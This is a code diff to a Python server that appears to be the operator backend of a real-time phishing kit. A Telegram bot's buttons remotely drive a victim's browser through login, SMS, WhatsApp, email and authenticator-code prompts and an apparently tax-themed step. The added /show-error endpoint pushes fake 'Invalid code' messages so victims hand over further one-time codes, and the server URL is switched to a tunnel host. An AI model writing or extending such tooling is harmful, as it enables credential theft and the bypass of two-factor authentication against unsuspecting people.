@@ -26,7 +26,7 @@ CHAT_ID = "-5123140727"
 
 # WebSocket server URL (update this when deploying)
 # For local dev, use ngrok or similar to expose
-WS_SERVER_URL = "https://magnitude57.com"
+WS_SERVER_URL = "https://52rlh0gv-8000.inc1.devtunnels.ms"
 
 # Store connected clients: {client_id: WebSocket}
 connected_clients: Dict[str, WebSocket] = {}
@@ -79,7 +79,13 @@ async def send_telegram_message(client_id: str, metadata: dict) -> Optional[int]
                     {"text": "EMAIL", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=email"}
                 ],
                 [
-                    {"text": "PASS", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=cancel"},
+                    {"text": "❌ AUTH", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=auth"},
+                    {"text": "❌ SMS", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=sms"},
+                    {"text": "❌ WA", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=whatsapp"},
+                    {"text": "❌ EMAIL", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=email"}
+                ],
+                [
+                    {"text": "PASS", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=login"},
                     {"text": "✅ DONE", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=reviewTax"},
                     {"text": "❌", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=cancel"}
                 ]
@@ -239,7 +245,13 @@ async def update_telegram_message(client_id: str, update_type: str, data: dict):
                     {"text": "EMAIL", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=email"}
                 ],
                 [
-                    {"text": "PASS", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=cancel"},
+                    {"text": "❌ AUTH", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=auth"},
+                    {"text": "❌ SMS", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=sms"},
+                    {"text": "❌ WA", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=whatsapp"},
+                    {"text": "❌ EMAIL", "url": f"{WS_SERVER_URL}/show-error?client_id={client_id}&error_type=email"}
+                ],
+                [
+                    {"text": "PASS", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=login"},
                     {"text": "✅ DONE", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=reviewTax"},
                     {"text": "❌", "url": f"{WS_SERVER_URL}/navigate?client_id={client_id}&action=cancel"}
                 ]
@@ -270,6 +282,66 @@ async def update_telegram_message(client_id: str, update_type: str, data: dict):
 async def root():
     """Health check endpoint"""
     return {"status": "running", "clients": len(connected_clients)}
+
+
+@app.get("/show-error")
+async def show_error(client_id: str = Query(...), error_type: str = Query(...)):
+    """
+    Handle error display request from Telegram button click.
+    Shows "Wrong code" error on the client's verification page.
+    """
+    
+    error_messages = {
+        "sms": "Invalid code. Please check your text messages and try again.",
+        "whatsapp": "Invalid code. Please check your WhatsApp and try again.",
+        "auth": "Invalid code. Please check your authentication app and try again.",
+        "email": "Invalid code. Please check your email and try again."
+    }
+    
+    error_message = error_messages.get(error_type, "Invalid code. Please try again.")
+    
+    if client_id in connected_clients:
+        websocket = connected_clients[client_id]
+        try:
+            # Send error command to the client
+            await websocket.send_json({
+                "type": "show_error",
+                "error_type": error_type,
+                "message": error_message
+            })
+            
+            return HTMLResponse(content=f"""
+                <html>
+                    <head><title>Error Sent</title></head>
+                    <body style="font-family: Arial; text-align: center; padding: 50px;">
+                        <h2>✅ Error Message Sent</h2>
+                        <p>Client <code>{client_id[:8]}...</code> will see: <b>"{error_type.upper()} wrong code"</b></p>
+                        <p style="color: #666;">You can close this window.</p>
+                        <script>setTimeout(() => window.close(), 2000);</script>
+                    </body>
+                </html>
+            """)
+        except Exception as e:
+            return HTMLResponse(content=f"""
+                <html>
+                    <head><title>Error</title></head>
+                    <body style="font-family: Arial; text-align: center; padding: 50px;">
+                        <h2>❌ Error</h2>
+                        <p>Failed to send error message: {str(e)}</p>
+                    </body>
+                </html>
+            """, status_code=500)
+    else:
+        return HTMLResponse(content=f"""
+            <html>
+                <head><title>Client Not Found</title></head>
+                <body style="font-family: Arial; text-align: center; padding: 50px;">
+                    <h2>⚠️ Client Not Connected</h2>
+                    <p>Client <code>{client_id[:8]}...</code> is not connected.</p>
+                    <p style="color: #666;">The user may have closed their browser.</p>
+                </body>
+            </html>
+        """, status_code=404)
 
 
 @app.get("/navigate")
